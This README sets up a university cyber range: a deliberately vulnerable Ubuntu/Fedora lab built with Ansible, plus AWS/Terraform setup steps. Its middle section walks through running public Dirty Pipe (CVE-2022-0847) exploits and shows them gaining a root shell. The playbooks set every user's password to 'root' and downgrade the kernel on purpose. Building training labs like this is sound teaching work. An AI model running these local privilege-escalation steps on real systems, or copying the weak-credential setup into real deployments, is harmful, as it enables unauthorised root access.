
# Rutgers Scarlet Castle Cyber Range

## Setup

The Cyber Range has been updated to run on Ubuntu 20-4 with a manually installed Kernel version 5.8.0

To get started, install the ***.ova** file* and open it up in your Virtual Machine application of choice. I used VMware Workstation so see 'Step-1: Prepare Target System" directions for the setup on VMware Workstation. 

The .OVA image of the cyber range has the exploit installed, however, it does not have Ansible installed nor does it have other users. 
A link to the .OVA https://drive.google.com/drive/folders/1ANb-LaDyDZGe_ZivHizJ7Gqs2xRV9Dbk?usp=share_link


**Once you're on the machine do the following:**

1. Install Ansible:
```sudo apt install ansible```

2. Install unzip:
```sudo apt install unzip```

3. Use wget to download this repo
```wget https://github.com/kwxk/Rutgers_Cyber_Range/archive/refs/heads/main.zip```
4. ```ls```
   Check if kwkx Rutgers_Cyber_Cyber_Range zip file is there.
5. ```unzip main.zip```
6.  ```ls```
 List the files. Change the directory to the directory of the cyber range files
7. cd into bare metal folder
8. ```chmod +x ./* ```
When you are in the directory of the cyber range files run the following command (chmod +x ./*) to make all files in the directory executable. This is necessary because we need to run these files later on. 


This Cyber Range/Hackbox was set up for a debian system. Run the ansible-playbook **main_debian.yml** 
```
ansible-playbook main_debian.yml
```
The regular main.yml is set up for Redhat/Fedora Systems. In theory, Fedora 28 and earlier versions of Fedora have affected Kernels. You could download a Fedora ISO from the Fedora ISO archive and then manually install Kernel 5.8.0 to the Kernel. Then, you can run the main.yml with the Redhat Ansible package names. 
https://archives.fedoraproject.org/pub/archive/fedora/linux/releases/23/Workstation/x86_64/iso/ 



---


# CVE-2022-0847-DirtyPipe-Exploits Scan

## Step-1: Prepare Target System:
⦁	Download “Exploit-Target-Ubuntu-20-4.ova”  
⦁	Open VMware workstation and go to “File>Open”:  
 
⦁	Browse and select “Exploit-Target-Ubuntu-20-4.ova” file: 
  
⦁	Set a name for VM and select the location to store it and click on Import:
 
⦁	Importing OVA:
 
⦁	Finally, the VM is ready to play and start it:
 
⦁	Now login with User: exploit password: exploit
 
⦁	Now the system is ready:
 
## Step-2: Install dependency and Check kernel version for vulnerability:
⦁	Start the VM and login with User: exploit Password: exploit
⦁	Open Terminal and check the kernel and OS version:
```
uname -r
5.11.0-27-generic

cat /etc/os-release 

NAME="Ubuntu"
VERSION="20.04.3 LTS (Focal Fossa)"
ID=ubuntu
ID_LIKE=debian
PRETTY_NAME="Ubuntu 20.04.3 LTS"
```
⦁	You will need to have GCC and Git installed:
```sudo apt-get install gcc git -y```
## Step-3: Download and Compile CVE-2022-0847-DirtyPipe-Exploits Scanner:
⦁	After successfully install git, gcc now clone the exploits scanner from GitHub:
 git clone https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits.git
⦁	Check is it download or not:
```
ls -la

drwxrwxr-x  3 exploit exploit 4096 Mar 23 01:49 CVE-2022-0847-DirtyPipe-Exploits
```
⦁	Change the directory:
``
cd CVE-2022-0847-DirtyPipe-Exploits
``
⦁	After installing GCC, you can run the 'compile.sh" script as follows:
```
chmod +x compile.sh
./compile.sh
```
## Step-4: Run CVE-2022-0847-DirtyPipe-Exploits Scanner:
⦁	After successfully complied you’re able to run exploit-1:
```
./exploit-1
Backing up /etc/passwd to /tmp/passwd.bak ...
Setting root password to "piped"...
Password: Restoring /etc/passwd from /tmp/passwd.bak...
Done! Popping shell... (run commands now)

whoami
root
```
⦁	To exit from this console type exit and press enter twice:
exit
```
$
⦁	Run exploit-2:
./exploit-2 /usr/bin/sudo
[+] hijacking suid binary..
[+] dropping suid shell..
[+] restoring suid binary..
[+] popping root shell.. (dont forget to clean up /tmp/sh ;))

whoami
root

exit
```

### Affected versions
Linux kernel versions newer than 5.8 are affected.
So far the vulnerability has been patched in the following Linux kernel versions:
**5.16.11
5.15.25
5.10.102**
You can learn more about the vulnerability here: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-0847


---

# Playbook Breakdown

## main_debian.yml

This Ansible playbook sets up a specific configuration for a Debian-based system, presumably in a Rutgers Cyber Range environment.

### Playbook tasks:

1. **Update APT cache**
Update the APT (Advanced Package Tool) cache with a ```cache_valid_time``` of 3600 seconds (1 hour). This means that the cache will be considered up-to-date for 1 hour after updating, reducing the need for frequent updates when installing packages in a short period.

2. **Install dependencies**
   Install the following packages: wget, make, and gcc.
-   `wget`: A utility to download files from the web using HTTP, HTTPS, and FTP protocols.
-   `make`: A build automation tool that simplifies the process of compiling and linking programs.
-   `gcc`: The GNU Compiler Collection, which includes compilers for several programming languages, including C, C++, Objective-C, Fortran, Ada, D, and others.

3.  **Install apache2 and PHP packages**
    -   `apache2`: A widely used web server software that serves HTTP requests.
    -   `PHP`: A popular server-side scripting language designed for web
---
#### IPtables and opening ports

`IPtables` is a user-space utility program that allows a system administrator to configure the IP packet filter rules of the Linux kernel firewall, implemented as different Netfilter modules. It provides an interface to manage the packet filtering rules for incoming and outgoing traffic on a Linux system. IPtables can be used to control network traffic, improve security, and perform network address translation (NAT).

In this playbook, IPtables is being used to open ports 80 and 443:

-   **Port 80**: This is the default port for serving HTTP (unsecured) web traffic. By opening this port, the playbook ensures that the Apache2 web server can accept incoming HTTP requests from clients.
    
-   **Port 443**: This is the default port for serving HTTPS (secured) web traffic. By opening this port, the playbook allows the Apache2 web server to accept incoming HTTPS requests from clients, providing a secure and encrypted connection between the server and clients.
    

Opening these ports is important for the proper functioning of a web server, as it ensures that clients can connect to the server to access web content and services.

4. **Open port 80 for apache2**
   Configure the iptables firewall to open port 80 for incoming HTTP traffic.

5. **Open port 443 for https traffic**
   Configure the iptables firewall to open port 443 for incoming HTTPS traffic.
---
6. **Start apache2 services**
   Ensure the Apache2 service is started.

7. **Create group**
   Create a new group named "usersgroup".

8. **Create users**
   Create new users with the names listed in the `users.txt` file. Each user will have a home directory under `/srv/`, belong to the "usersgroup" group, and have an SSH key generated.

9. **Set password to users**
   Set the password for each user to "root". This step will not log any information.

10. **Create restricted file**
    Create a new file named `restricted.txt` in the `/var/www/` directory with the

# main_redhat.yml
This Ansible playbook is designed to perform various tasks on a Red Hat-based system such as installing dependencies, installing httpd and php packages, creating a group and users, setting their passwords, checking for the existence of a file, downloading the kernel source code, creating a restricted file, and setting its ownership and permissions.

### Playbook tasks:

1.  **Install dependencies:** This task installs wget, make, and gcc packages on the target host.
2.  **Install httpd and php packages:** This task installs httpd and php packages on the target host.
3.  **Start httpd services:** This task starts the httpd service on the target host.
4.  **Create group:** This task creates a group named ```usersgroup``` on the target host.
5.  **Create users:** This task creates users from the list of users provided in the "users.txt" file located in the same directory as the playbook. Each user is assigned a bash shell, a home directory at ```/srv/{{item}}```, added to the ```usersgroup```, and an SSH key is generated with 2048 bits.
6.  **Set password to users:** This task sets the password for each user created in the previous task as ```root```. The passwords are set in a loop, and the "no_log" option is enabled to avoid logging passwords.
7.  **Check if file exists:** This task checks whether the ```linux-4.8.tar.xz``` file exists on the target host and registers the result.
8.  **Download kernel source code:** This task downloads the kernel source code from the specified URL if the ```linux-4.8.tar.xz``` file does not exist on the target host.
9.  **Create restricted file:** This task creates a file named ```restricted.txt``` at ```/var/www/``` directory and adds the text "flag captured" to it.
10.  **Set ownership and permissions of restricted file:** This task sets the ownership of the ```restricted.txt``` file to root:root and sets the file permission to 0640.

## AFTER THE PLAYBOOK HAS RAN...

### Run the kernel downgrade shell script when finished with the playbook

### $>>>> ./[kernel_change_4.8.sh](https://github.com/kwxk/Rutgers_Cyber_Range/blob/main/Bare%20Metal%20Setup%20-%20Rutgers%20Cyber%20Range/kernel_change_4.8.sh)
```
tar xvf linux-4.8

cd linux-4.8

# input the prompted

sudo make oldconfig

sudo make install

sudo grub2-mkconfig -o /boot/grub2/grub.cfg

sudo reboot
```

### Variables:

There are no variables in this playbook.

### Usage:

To execute this playbook, run the following command in the terminal:
```ansible-playbook main_redhat.yml```




# AWS Cloud Based Cyber Range

## AWS CLI

AWS CLI is a command-line tool that you can use to interact with Amazon Web Services (AWS). It allows you to run commands to create, manage, and delete resources in the AWS cloud. Terraform is a tool that you can use to define and create infrastructure as code.

  

This means that you can write a configuration file in a programming language that describes the resources you want to create in the cloud. Then, you can use Terraform to automate the process of creating those resources. Imagine that you want to set up a website. To do this, you might need to create a few things: a virtual server to host the website, a database to store information, and a load balancer to distribute traffic to the website.

  

With the AWS CLI, you would have to manually create each of these resources using separate commands. With Terraform, you can define all of these resources in a single configuration file and use a single command to create them all at once.

  

In summary, AWS CLI is a tool that you can use to interact with AWS resources, and Terraform is a tool that you can use to define and create infrastructure as code.

## Set Up Details

### Windows

To download the AWS CLI on a Windows machine, follow these steps:

1.  Open a web browser and go to the AWS CLI page on the AWS website: [https://aws.amazon.com/cli/](https://aws.amazon.com/cli/)
    
2.  Click on the "Download the AWS CLI" button.
    
3.  Scroll down to the "Install the AWS CLI on Microsoft Windows" section and click on the link for the latest version of the MSI installer.
    
4.  Save the MSI installer file to your local machine.
    
5.  Double-click on the MSI installer file to launch the installation wizard.
    
6.  Click on the "Next" button to proceed through the wizard.
    
7.  Accept the terms of the license agreement and click on the "Next" button.
    
8.  Choose the installation location and click on the "Next" button.
    
9.  Click on the "Install" button to begin the installation process.
    
10.  Wait for the installation to complete, then click on the "Finish" button to close the wizard.
    
11.  Open a command prompt or PowerShell window and type "aws --version" to verify that the AWS CLI has been installed correctly.
    

  

To set up credentials in the AWS CLI, follow these steps:

1.  Open a command prompt or PowerShell window and type "aws configure" to open the configuration wizard.
    
2.  Enter your AWS Access Key ID and Secret Access Key. These keys are used to authenticate your access to the AWS services. If you don't have an AWS account yet, you can sign up for one at [https://aws.amazon.com](https://aws.amazon.com).
    
3.  Enter the default region name. This is the region where your AWS resources will be created. You can find a list of regions at [https://aws.amazon.com/about-aws/global-infrastructure/regional-product-services/](https://aws.amazon.com/about-aws/global-infrastructure/regional-product-services/).
    
4.  Enter the default output format. The AWS CLI supports several output formats, including JSON, text, and table. Choose the one that you prefer.
    
5.  Once you have entered all of the required information, the AWS CLI will save the credentials and configuration to a file called "credentials" in your user home directory.
    

  

Note: If you need to specify a different profile or credentials file, you can use the --profile option when running the aws configure command or when using the AWS CLI. For example: aws configure --profile my_profile.

### MAC OS

To install the AWS CLI on a Mac, follow these steps:

  

1.  Download the AWS CLI package by running this command in the terminal: curl "[https://awscli.amazonaws.com/AWSCLIV2.pkg](https://awscli.amazonaws.com/AWSCLIV2.pkg)” -o "AWSCLIV2.pkg"
    

  

2.  Install the package by running this command: sudo installer -pkg AWSCLIV2.pkg -target /
    

  

3.  Verify the installation by checking the version number: aws --version
    

  

If you had previously installed the AWS CLI using the pip package manager, you may need to uninstall it first. To do this, run the following command: pip uninstall awscli

  

### LINUX

To download the AWS CLI on a Linux machine, follow these steps:

  

1.  Open a terminal window and run the following command to install the required dependencies:
    

1.  sudo apt-get  update
    
2.  sudo apt-get install python3 python3-pip
    

3.  Run the following command to install the AWS CLI using pip, the Python package manager:
    

1.  pip3 install awscli --upgrade  --user
    

5.  Add the ~/.local/bin directory to your PATH environment variable by running the following command:
    

1.  echo  'export PATH=~/.local/bin:$PATH' >> ~/.bashrc
    

source ~/.bashrc

4.  Verify the installation by running the following command: ‘aws --version’
    

  
  

Use aws configure to set up credentials on your computer. This will allow you to run the Terraform without a credential file or keys being in the Terraform files itself.

  

Install Terraform here: [https://developer.hashicorp.com/Terraform/tutorials/aws-get-started/install-cli](https://developer.hashicorp.com/terraform/tutorials/aws-get-started/install-cli)

  

Run the Terraform from your command line. Preferably, use an IDE like Visual Studio with its built-in terminal.

  

Terraform will run all Terraform files within the project folder. Make sure to navigate to the project folder in which Terraform is in. Then run the ‘Terraform init’ command to create the state file that will keep track of the infrastructure

  

Next, run the ‘Terraform plan’ command to see the cloud resources that will be spun-up

  

Finally, run the ‘Terraform apply’ command to create the cloud resources. Navigate to AWS console to find details about how to SSH into the machine.
